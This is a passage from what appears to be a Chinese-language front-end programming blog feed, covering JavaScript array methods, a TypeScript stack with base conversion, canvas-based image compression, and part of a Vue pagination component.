<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">arr.<span class="title function_">some</span>(<span class="function"><span class="params">item</span> =&gt;</span> item % <span class="number">2</span> == <span class="number">0</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h3 id="filter">filter()</h3>
<p><strong>返回一个符合条件的新数组</strong>, 用于从数组内部筛选元素</p>
<p>语法: <code>filter(item=&gt;item)</code>​</p>
<p>filter 会遍历数组的每一个元素传入回调函数, 如果回调返回 true, 那么这个元素就会被加入返回的数组内</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">arr = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br><span class="line">arr.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item % <span class="number">2</span> == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [ 4, 6 ]</span></span><br></pre></td></tr></table></figure>
<p>‍</p>
<h3 id="map">map()</h3>
<p><strong>返回回调函数返回值组成的数组</strong>, 可以用来处理数组</p>
<p>语法: <code>map(item=&gt;item)</code>​</p>
<p>map 会遍历数组的每一个元素传入回调函数, 并将回调函数的返回值放入 map 返回的数组中</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&gt; arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">[ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line">&gt; arr.<span class="title function_">map</span>(<span class="function"><span class="params">item</span>=&gt;</span>item+<span class="number">10</span>)</span><br><span class="line">[ <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span> ]</span><br></pre></td></tr></table></figure>
<h3 id="foreach">foreach()</h3>
<p><strong>无返回值</strong>, 遍历数组每个元素并执行回调函数</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&gt; arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">[ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line">&gt; arr.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(item,index)&#125;)</span><br><span class="line"><span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="number">4</span> <span class="number">3</span></span><br><span class="line"><span class="number">5</span> <span class="number">4</span></span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure>
<h3 id="reduce">reduce()</h3>
<p>详情参阅<br>
<a href="https://www.freecodecamp.org/chinese/news/the-ultimate-guide-to-javascript-array-methods-reduce/">https://www.freecodecamp.org/chinese/news/the-ultimate-guide-to-javascript-array-methods-reduce/</a></p>
<p>用来处理数组, 最后返回一个任意类型的值</p>
<p>语法: <code>arr.reduce((pre,current)=&gt;&#123;&#125;,initVal)</code>​</p>
<p>参数:</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>​<code>pre</code>​ :上次迭代的结果</p>
</li>
<li class="lvl-4">
<p>​<code>current</code>​: 当前迭代的值</p>
</li>
<li class="lvl-4">
<p>​<code>initVal</code>​: 初始值</p>
</li>
</ul>
<p>执行过程: <code>reduce</code> ​ 方法会迭代数组内所有值, 并且会把上次 <code>return</code> ​ 的执行结果作为当前的 <code>pre</code> ​ 参数</p>
<p>注意: <code>reduce</code> ​ 中一定要使用 <code>return</code> ​ 返回值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 累加值</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res = arr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, val</span>) =&gt;</span> &#123;</span><br><span class="line">    sum += val;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼合字符串</span></span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="string">&quot;小明&quot;</span>, <span class="string">&quot;小红&quot;</span>, <span class="string">&quot;小强&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res2 = arr2.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, val</span>) =&gt;</span> &#123;</span><br><span class="line">    sum += val;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求每个人的年龄和</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr3 = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;小明&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;小hs&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">30</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;小a&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">50</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res3 = arr3.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, val</span>) =&gt;</span> &#123;</span><br><span class="line">    sum += val.<span class="property">age</span>;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res3);</span><br></pre></td></tr></table></figure>
<p>‍</p>
<h2 id="生成数组方法">生成数组方法</h2>
<h3 id="from">from()</h3>
<p>可以将伪数组(例如函数的 <code>arguments</code>​)转换为真正的数组, 返回转换完成的数组</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="variable language_">arguments</span>);</span><br></pre></td></tr></table></figure>
<p>还可以接受第二个参数，用来对每个元素进行处理，将处理后的值放入返回的数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="title function_">from</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br><span class="line"><span class="comment">// [1, 4, 9]</span></span><br></pre></td></tr></table></figure>
<h2 id="数组搜索方法">数组搜索方法</h2>
<p>​<code>index</code>​ 系列方法直接传入要搜索的值, <code>find</code>​ 系列方法传入回调</p>
<h3 id="indexOf">indexOf()</h3>
<p>返回<strong>搜索结果所在的下标,</strong> 如果没有结果那么返回 **<code>-1</code>**​</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&gt; arr</span><br><span class="line">[ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line">&gt; arr.<span class="title function_">indexOf</span>(<span class="number">3</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
<h3 id="lastIndexOf">lastIndexOf()</h3>
<p>从<strong>后面开始搜索</strong>, 返回<strong>搜索结果所在的下标, ​</strong> 如果没有结果那么返回 **<code>-1</code>**​</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&gt; arr=[<span class="number">11</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>]</span><br><span class="line">[</span><br><span class="line">  <span class="number">11</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">  <span class="number">11</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span></span><br><span class="line">]</span><br><span class="line">&gt; arr.<span class="title function_">lastIndexOf</span>(<span class="number">11</span>)</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>
<h3 id="includes">includes()</h3>
<p>搜索数组, 如果包含参数值, 返回<code>true</code>​, 否则返回<code>false</code>​</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&gt; arr.<span class="title function_">includes</span>(<span class="number">11</span>)</span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h3 id="find">find()</h3>
<p>传入一个回单函数, <code>find</code>​<strong>返回第一个回调函数返回 true 的元素</strong></p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&gt; arr=[<span class="number">11</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>]</span><br><span class="line">[</span><br><span class="line">  <span class="number">11</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">  <span class="number">11</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span></span><br><span class="line">]</span><br><span class="line">&gt; arr.<span class="title function_">find</span>(<span class="function"><span class="params">item</span>=&gt;</span>item&gt;<span class="number">0</span>)</span><br><span class="line"><span class="number">11</span></span><br></pre></td></tr></table></figure>
<p>‍</p>
<h3 id="findIndex">findIndex()</h3>
<p>传入一个回单函数, <code>find</code>​<strong>返回第一个回调函数返回 true 的元素的下标</strong></p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&gt; arr.<span class="title function_">findIndex</span>(<span class="function"><span class="params">item</span>=&gt;</span>item&gt;<span class="number">12</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h3 id="findLast">findLast()</h3>
<p>与<code>find</code>​ 类似, 从后查找</p>
<h3 id="findLastIndex">findLastIndex()</h3>
<p>与<code>findIndex</code>​ 类似, 从后查找</p>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构学习-栈</title>
    <url>/20221214/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-%E6%A0%88/</url>
    <content><![CDATA[<p>栈结构遵循以下规则</p>
<ul class="lvl-0">
<li class="lvl-4">数据从栈顶 (又称为栈尾) 进入</li>
<li class="lvl-4">从栈顶退出</li>
<li class="lvl-4">遵循后进先出的 LIFO 原则</li>
</ul>
<p>一个栈应该有以下方法: push pop peek isEmpty size clear toString<br /></p>
<span id="more"></span>
<h2 id="封装一个栈">封装一个栈</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一个栈应该有以下方法: push pop peek isEmpty size clear toString</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="attr">stack</span>: <span class="built_in">unknown</span>[] = [];</span><br><span class="line"></span><br><span class="line">    <span class="title function_">push</span>(<span class="params">data: <span class="built_in">unknown</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">stack</span>.<span class="title function_">push</span>(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">pop</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">stack</span>.<span class="title function_">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回栈顶元素</span></span><br><span class="line">    <span class="title function_">peek</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">stack</span>[<span class="variable language_">this</span>.<span class="property">stack</span>.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">isEmpty</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">stack</span>.<span class="property">length</span> === <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">size</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">stack</span>.<span class="property">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">stack</span> = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">stack</span>.<span class="title function_">join</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> stack = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">debugger</span>;</span><br></pre></td></tr></table></figure>
<h2 id="应用-进制转换">应用: 进制转换</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Stack</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./stack&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进制转换 利用辗转相除法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">convert</span>(<span class="params">DecNumber: <span class="built_in">number</span>, base: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> remStack = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">    <span class="keyword">const</span> baseString = <span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="title class_">DecNumber</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        remStack.<span class="title function_">push</span>(<span class="title class_">DecNumber</span> % base);</span><br><span class="line">        <span class="title class_">DecNumber</span> = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">DecNumber</span> / base);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!remStack.<span class="title function_">isEmpty</span>()) &#123;</span><br><span class="line">        res += baseString[remStack.<span class="title function_">pop</span>() <span class="keyword">as</span> <span class="built_in">number</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">convert</span>(<span class="number">1234</span>, <span class="number">16</span>));</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript实现图片压缩</title>
    <url>/20230203/JavaScript%E5%AE%9E%E7%8E%B0%E5%9B%BE%E7%89%87%E5%8E%8B%E7%BC%A9/</url>
    <content><![CDATA[<h1>图片等比缩小的方法</h1>
<img src="/20230203/JavaScript%E5%AE%9E%E7%8E%B0%E5%9B%BE%E7%89%87%E5%8E%8B%E7%BC%A9/%E5%9B%BE%E7%89%87%E7%AD%89%E6%AF%94%E7%BC%A9%E6%94%BE.png" class="" title="图片等比缩放">
<h1>图片压缩的基本思路</h1>
<p>压缩图片主要利用了<code>canvas</code>的<code>toBlob</code>方法, <code>toBlob</code>方法可以将<code>canvas</code>画布的画面转换成<code>Blob</code>对象, 同时设置质量</p>
<ol>
<li class="lvl-3">
<p>获取<code>input</code>数据, 使用<code>fileReader</code>转换成 <code>dataUrl</code></p>
</li>
<li class="lvl-3">
<p>将<code>dataUrl</code>的值赋给<code>image</code>的<code>src</code></p>
</li>
<li class="lvl-3">
<p>将<code>image</code>绘制进<code>canvas</code>, 注意这里可以对图片尺寸进行控制</p>
</li>
<li class="lvl-3">
<p>使用<code>canvas.toBlob</code>获取 blob 对象, 可以在其中设置压缩比例</p>
</li>
<li class="lvl-3">
<p>上传图片</p>
</li>
</ol>
 <span id="more"></span>
<h1>完整代码</h1>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 上传图片压缩的步骤</span></span><br><span class="line"><span class="comment">// 1. 获取input数据, 使用fileReader转换成dataUrl</span></span><br><span class="line"><span class="comment">// 2. 将dataUrl的值赋给image的src</span></span><br><span class="line"><span class="comment">// 3. 将image绘制进canvas</span></span><br><span class="line"><span class="comment">// 4. 使用canvas.toBlob获取blob对象, 可以在其中设置压缩比例</span></span><br><span class="line"><span class="comment">// 5. 上传图片</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fileToImg = (<span class="attr">file</span>: <span class="title class_">File</span>): <span class="title class_">Promise</span>&lt;<span class="title class_">HTMLImageElement</span>&gt; =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">        <span class="keyword">const</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">        <span class="comment">// 将传进来的file转换成dataURl</span></span><br><span class="line">        reader.<span class="title function_">readAsDataURL</span>(file);</span><br><span class="line">        reader.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            img.<span class="property">src</span> = reader.<span class="property">result</span> <span class="keyword">as</span> <span class="built_in">string</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        reader.<span class="property">onerror</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(e);</span><br><span class="line">        &#125;;</span><br><span class="line">        img.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(img);</span><br><span class="line">        &#125;;</span><br><span class="line">        img.<span class="property">onerror</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(e);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> imgToBlob = (</span><br><span class="line">    <span class="attr">img</span>: <span class="title class_">HTMLImageElement</span>,</span><br><span class="line">    <span class="attr">maxWidth</span>: <span class="built_in">number</span>,</span><br><span class="line">    <span class="attr">maxHeight</span>: <span class="built_in">number</span>,</span><br><span class="line">    <span class="attr">quality</span>: <span class="built_in">number</span>,</span><br><span class="line">    <span class="keyword">type</span> = <span class="string">&quot;image/png&quot;</span>,</span><br><span class="line">): <span class="title class_">Promise</span>&lt;<span class="title class_">Blob</span>&gt; =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> canvas = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取图片原始尺寸</span></span><br><span class="line">        <span class="keyword">const</span> &#123; <span class="attr">width</span>: originWidth, <span class="attr">height</span>: originHeight &#125; = img;</span><br><span class="line">        <span class="comment">// 确定目标尺寸</span></span><br><span class="line">        <span class="keyword">let</span> targetWidth = originWidth,</span><br><span class="line">            targetHeight = originHeight;</span><br><span class="line">        <span class="comment">// 如果图片尺寸大于目标尺寸, 那么就进行等比缩放</span></span><br><span class="line">        <span class="keyword">if</span> (targetWidth &gt; maxWidth || targetHeight &gt; maxHeight) &#123;</span><br><span class="line">            <span class="comment">// 等比缩小的算法</span></span><br><span class="line">            <span class="comment">// 如果是横着的图, 图片的宽等于最大宽度, 高等比缩放;</span></span><br><span class="line">            <span class="comment">// 如果是竖着的图, 图片的高等于最大高度, 宽等比缩放;</span></span><br><span class="line">            <span class="comment">// 先判断是横着的图还是竖着的图</span></span><br><span class="line">            <span class="keyword">if</span> (targetWidth &gt; targetHeight) &#123;</span><br><span class="line">                <span class="comment">//横着的</span></span><br><span class="line">                targetWidth = maxWidth;</span><br><span class="line">                targetHeight = targetHeight * (maxWidth / originWidth);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//竖着的</span></span><br><span class="line">                targetHeight = maxHeight;</span><br><span class="line">                targetWidth = targetWidth * (maxHeight / originHeight);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 把img绘制进canvas</span></span><br><span class="line">            canvas.<span class="property">width</span> = targetWidth;</span><br><span class="line">            canvas.<span class="property">height</span> = targetHeight;</span><br><span class="line">            ctx?.<span class="title function_">clearRect</span>(<span class="number">0</span>, <span class="number">0</span>, targetWidth, targetHeight);</span><br><span class="line">            ctx?.<span class="title function_">drawImage</span>(img, <span class="number">0</span>, <span class="number">0</span>, targetWidth, targetHeight);</span><br><span class="line">            <span class="comment">// 获取blob对象</span></span><br><span class="line">            canvas.<span class="title function_">toBlob</span>(</span><br><span class="line">                <span class="function"><span class="params">blob</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (blob) &#123;</span><br><span class="line">                        <span class="title function_">resolve</span>(blob);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;转换失败&quot;</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="keyword">type</span>,</span><br><span class="line">                quality,</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> inp = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#input&quot;</span>);</span><br><span class="line">inp?.<span class="title function_">addEventListener</span>(<span class="string">&quot;change&quot;</span>, <span class="keyword">async</span> e =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> inputEle = e.<span class="property">target</span> <span class="keyword">as</span> <span class="title class_">HTMLInputElement</span>;</span><br><span class="line">    <span class="keyword">if</span> (inputEle.<span class="property">files</span>?.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> img = <span class="keyword">await</span> <span class="title function_">fileToImg</span>(inputEle.<span class="property">files</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">const</span> blob = <span class="keyword">await</span> <span class="title function_">imgToBlob</span>(img, <span class="number">1000</span>, <span class="number">1000</span>, <span class="number">0.2</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(blob);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue封装一个分页器组件</title>
    <url>/20221204/Vue%E5%B0%81%E8%A3%85%E4%B8%80%E4%B8%AA%E5%88%86%E9%A1%B5%E5%99%A8%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<p>一个分页器组件最重要的四个参数(需要外界传入)</p>
<ul class="lvl-0">
<li class="lvl-4">当前第几页: pageNo</li>
<li class="lvl-4">每页展示的数据数量: pageSize</li>
<li class="lvl-4">共有多少数据: total</li>
<li class="lvl-4">显示的连续页码: continues</li>
</ul>
<span id="more"></span>
<p>通过以上信息可以计算出来的数据</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>共有多少页: total/pageSize 向上取整</p>
</li>
<li class="lvl-4">
<p>显示的连续页码的起始与结束</p>
<ul class="lvl-2">
<li class="lvl-8">
<p>如果总页数小于要显示的连续页码</p>
<ul class="lvl-4">
<li class="lvl-12">起始为 1</li>
<li class="lvl-12">结束为总页数</li>
</ul>
</li>
<li class="lvl-8">
<p>如果总页数大于连续页码</p>
<ul class="lvl-4">
<li class="lvl-12">
<p>先计算出当前页码左边和右边要显示几个页码: 连续页码/2 向下取整</p>
<ul class="lvl-6">
<li class="lvl-16">
<p>起始页码: 当前显示的页码-上边计算出来的数据</p>
<ul class="lvl-8">
<li class="lvl-20">如果小于 1, 那么起始页码等于 1, 结束页码等于要显示的连续页码</li>
</ul>
</li>
<li class="lvl-16">
<p>结束页码: 当前显示的页码+上边计算出来的数据</p>
<ul class="lvl-8">
<li class="lvl-20">如果大于总页码, 那么起始页码等于总页码-连续页码+1, 结束页码等于总页码</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1>分页器组件</h1>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pagination&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">:disabled</span>=<span class="string">&quot;pageNo == 1&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            @<span class="attr">click</span>=<span class="string">&quot;emit(&#x27;changePage&#x27;, pageNo - 1)&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">            上一页</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-if</span>=<span class="string">&quot;startAndEnd.start &gt; 1&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-if</span>=<span class="string">&quot;startAndEnd.start &gt; 2&quot;</span>&gt;</span>···<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">:class</span>=<span class="string">&quot;&#123;</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">                active: pageNo == index + 1,</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">            &#125;&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">v-for</span>=<span class="string">&quot;(page, index) in startAndEnd.end&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">v-show</span>=<span class="string">&quot;page &gt;= startAndEnd.start&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            @<span class="attr">click</span>=<span class="string">&quot;emit(&#x27;changePage&#x27;, index + 1)&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;&#123; page &#125;&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-if</span>=<span class="string">&quot;startAndEnd.end &lt; totalPage - 1&quot;</span>&gt;</span>···<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-if</span>=<span class="string">&quot;startAndEnd.end &lt; totalPage&quot;</span>&gt;</span>&#123;&#123; totalPage &#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">:disabled</span>=<span class="string">&quot;pageNo == totalPage&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            @<span class="attr">click</span>=<span class="string">&quot;emit(&#x27;changePage&#x27;, pageNo + 1)&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">            下一页</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span 